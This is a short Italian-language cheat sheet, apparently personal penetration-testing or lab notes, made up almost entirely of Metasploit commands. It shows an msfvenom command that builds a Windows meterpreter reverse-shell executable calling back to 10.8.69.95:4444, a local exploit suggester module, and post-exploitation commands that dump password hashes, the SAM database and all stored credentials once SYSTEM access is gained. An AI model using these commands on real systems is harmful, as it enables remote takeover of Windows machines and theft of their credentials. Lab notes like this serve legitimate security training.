### **GENERARE UNA SHELL**
```bash
msfvenom -p windows/meterpreter/reverse_tcp lhost=10.8.69.95 lport=4444 -f exe > shell.exe
```

### **EXPLOIT SUGGESTER**
```MSF
run post/multi/recon/local_exploit_suggester
```
### **HASH DUMP**
==devi essere system==
```MSF
hashdump
```
```MSF
lsa_dump_sam
```

### **DUMP CREDENZIALI**
==Devi essere system==
```MSF
creds_all
```
